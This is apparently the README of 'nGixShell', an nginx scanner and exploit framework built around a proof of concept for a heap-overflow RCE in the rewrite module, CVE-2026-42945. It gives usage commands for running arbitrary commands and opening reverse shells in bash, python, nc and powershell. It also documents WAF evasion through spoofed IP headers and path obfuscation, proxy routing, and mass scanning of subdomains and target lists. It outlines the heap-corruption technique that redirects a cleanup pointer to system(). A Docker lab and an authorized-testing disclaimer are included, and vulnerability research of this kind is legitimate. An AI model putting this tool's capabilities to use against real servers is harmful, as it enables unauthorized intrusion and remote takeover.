<div align="center">
  <img src="banner.svg" alt="nGixShell" width="100%"/>
</div>

---

nginx CVE scanner + RCE exploit framework.

Proof of concept for **CVE-2026-42945** — a critical heap buffer overflow in NGINX's `ngx_http_rewrite_module` — plus a scanner covering **17 known nginx CVEs** with automated HTTP probes, fingerprinting, web security auditing, WAF detection/bypass, and report generation.

> Original vulnerability discovered by [depthfirst](https://depthfirst.com)'s security analysis system.

---

## Quick Start

```bash
# Build the lab environment
docker compose -f env/docker-compose.yml up -d

# Auto mode — fingerprint + CVE scan + web audit
python3 ngixshell.py 127.0.0.1:19321

# Execute command via RCE
python3 ngixshell.py 127.0.0.1:19321 --cmd 'id'

# Reverse shell (IP auto-detected)
python3 ngixshell.py 127.0.0.1:19321 --shell

# Detect + bypass WAF
python3 ngixshell.py 127.0.0.1:19321 --waf-bypass

# Scan subdomains
python3 ngixshell.py --subdomain-scan example.com --scan-port 443

# Multiple targets
python3 ngixshell.py --target-file hosts.txt
```

No flags required — pointing the tool at a target runs everything automatically.  
TLS is **auto-detected**. nginx is detected even with `server_tokens off`.

---

## Usage

```
ngixshell.py [TARGET] [OPTIONS]

TARGET formats:
  127.0.0.1
  192.168.1.10:8080
  http://192.168.1.10:8080
  https://target.local
```

### Modes

| Flag | Description |
|---|---|
| *(none)* | **Auto** — fingerprint + CVE scan + web audit |
| `--cmd 'CMD'` | Execute command via CVE-2026-42945 RCE |
| `--cmd-file FILE` | Execute commands from file (joined with `;`) |
| `--shell` | Pop a reverse shell |
| `--shell-type TYPE` | Payload type: `bash` `python` `perl` `php` `nc` `powershell` (default: python) |
| `--upgrade-shell` | Auto-send PTY upgrade after shell connects |
| `--subdomain-scan DOMAIN` | Find vulnerable nginx on subdomains |
| `--cve CVE-ID` | Test one specific CVE |
| `--list-cves` | Print all 17 CVEs with CVSS and probe info |
| `--list-candidates` | Print heap address candidates |
| `--dry-run` | Fingerprint + scan only, no exploit |
| `--target-file FILE` | Scan multiple hosts from a file |

### WAF

| Flag | Description |
|---|---|
| `--waf-detect` | Detect WAF before scanning |
| `--waf-bypass` | Enable all bypass techniques (also runs detection) |
| `--waf-ip IP` | Spoof this IP in bypass headers (default: random RFC1918) |

**Bypass techniques** (all active when `--waf-bypass` is set):
- IP spoofing headers: `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`, `True-Client-IP`, `X-Remote-IP`, `X-Client-IP`
- User-Agent rotation — 11 real browser/bot UAs per request
- Path obfuscation — double-slash, `/./` padding, percent-encoding, case variation (random per request)
- Header case randomisation — breaks WAF case-sensitive pattern matching

**WAF detection** covers: Cloudflare, AWS WAF, Akamai, Imperva/Incapsula, ModSecurity, F5 BIG-IP ASM, Sucuri, Barracuda, NAXSI, Fastly, Wordfence

### Web Audit

Runs automatically in scan mode. All modules can be skipped individually.

| Flag | Description |
|---|---|
| `--skip-headers` | Skip HTTP security header audit |
| `--skip-paths` | Skip path/file discovery |
| `--skip-vhosts` | Skip virtual host enumeration |
| `--skip-tls` | Skip TLS protocol audit |
| `--path-wordlist FILE` | Extra paths to probe (one per line) |

**Header audit** checks: HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, version-leaking headers

**Path discovery** probes 50+ paths with catch-all detection — a sentinel request eliminates false positives from catch-all 403/301 rules before scanning

**Virtual host enumeration** requires both status AND body to differ from baseline, preventing default server block false positives

**TLS audit** tests TLS 1.0–1.3 support and certificate expiry/self-signed status

**stub_status** parses nginx active connection metrics from `/nginx_status` if exposed

### Connection

| Flag | Description |
|---|---|
| `--port PORT` | Override port |
| `--tls` | Force TLS (auto-detected by default) |
| `--proxy URL` | Proxy: `http://`, `https://`, `socks5://` |

### HTTP

| Flag | Description |
|---|---|
| `--user-agent UA` | Custom User-Agent |
| `--auth USER:PASS` | HTTP Basic auth |
| `--cookie VALUE` | Cookie header |
| `--header NAME:VALUE` | Extra header (repeatable) |

### Rate / Timing

| Flag | Description |
|---|---|
| `--rate-limit RPS` | Max requests per second |
| `--jitter MS` | Random delay 0–MS ms between requests |
| `--retry N` | Retry inconclusive probes (default: 1) |
| `--timeout-multiplier X` | Scale all timeouts (default: 1.0) |

### Output

| Flag | Description |
|---|---|
| `--output FILE` | Write log to FILE |
| `--json` | Print JSON summary at end |
| `--html-report [FILE]` | Generate HTML report (default name: `ngixshell_<host>_<ts>.html`) |
| `--verbose` | Debug output |

---

## CVE Coverage

| CVE | CVSS | Description | Probe |
|---|---|---|---|
| CVE-2026-42945 | 9.8 CRITICAL | Heap overflow in rewrite module (RCE) | exploit |
| CVE-2026-42946 | 8.1 HIGH | Memory corruption in rewrite engine | version |
| CVE-2022-41741 | 7.8 HIGH | Memory corruption in mp4 module | version |
| CVE-2021-23017 | 7.7 HIGH | Off-by-one in DNS resolver | version |
| CVE-2016-1247 | 7.8 HIGH | Log file symlink privesc (local) | version |
| CVE-2017-7529 | 7.5 HIGH | Range filter integer overflow | HTTP probe |
| CVE-2026-40701 | 7.5 HIGH | Memory corruption in request processing | version |
| CVE-2026-42934 | 7.5 HIGH | Memory corruption (same advisory) | version |
| CVE-2022-41742 | 7.5 HIGH | Memory disclosure in mp4 module | version |
| CVE-2013-4547 | 7.5 HIGH | URI space+NUL bypass | HTTP probe |
| CVE-2013-2028 | 7.5 HIGH | Chunked encoding stack overflow | HTTP probe |
| CVE-2009-2629 | 7.5 HIGH | Buffer underflow in URI parsing | version |
| CVE-2012-2089 | 6.8 MEDIUM | Buffer overflow in mp4 module | version |
| CVE-2019-20372 | 5.3 MEDIUM | HTTP request smuggling | HTTP probe |
| CVE-2011-4963 | 5.0 MEDIUM | IPv6 literal access bypass | HTTP probe |
| CVE-2009-3896 | 5.0 MEDIUM | NULL pointer dereference DoS | version |
| CVE-2014-3616 | 4.3 MEDIUM | TLS SNI virtual host confusion | version |

---

## The Bug (CVE-2026-42945 TL;DR)

NGINX's script engine uses a two-pass process: first compute buffer size, then copy. The `is_args` flag is set on the main engine when a `rewrite` replacement contains `?`, but the length-calculation pass runs on a freshly zeroed sub-engine:

- **Length pass** sees `is_args = 0` → returns raw capture length
- **Copy pass** sees `is_args = 1` → calls `ngx_escape_uri` with `NGX_ESCAPE_ARGS`, expanding each escapable byte to 3 bytes

The copy overflows the undersized heap buffer with attacker-controlled URI data. Exploitation uses cross-request heap feng shui to corrupt an adjacent `ngx_pool_t`'s cleanup pointer, redirecting it to a fake `ngx_pool_cleanup_s` invoking `system()` on pool destruction.

---

## Affected Versions

| Product | Affected | Fixed in |
|---|---|---|
| NGINX Open Source | 0.6.27 – 1.30.0 | 1.31.0, 1.30.1 |
| NGINX Plus | R32 – R36 | R36 P4, R35 P2, R32 P6 |

Full vendor advisory: <https://my.f5.com/manage/s/article/K000160932>

---

## Setup

Tested on Ubuntu 24.04.3 LTS. No external dependencies — pure Python 3 stdlib.

```bash
# Start the vulnerable lab (nginx 1.25.3)
docker compose -f env/docker-compose.yml up -d

# Full scan
python3 ngixshell.py 127.0.0.1:19321

# RCE
python3 ngixshell.py 127.0.0.1:19321 --cmd 'id' --json

# Reverse shell — bash payload, PTY auto-upgrade
python3 ngixshell.py 127.0.0.1:19321 --shell --shell-type bash --upgrade-shell

# WAF bypass scan
python3 ngixshell.py 127.0.0.1:19321 --waf-bypass --waf-ip 10.10.10.1

# Through SOCKS5 proxy
python3 ngixshell.py 192.168.1.10 --proxy socks5://127.0.0.1:9050

# Subdomain scan with rate limiting
python3 ngixshell.py --subdomain-scan example.com --scan-port 443 --rate-limit 10

# Multiple targets, JSON output, HTML report
python3 ngixshell.py --target-file hosts.txt --json --html-report results.html
```

---

## Disclaimer

For authorized security testing, CTF competitions, and research only.
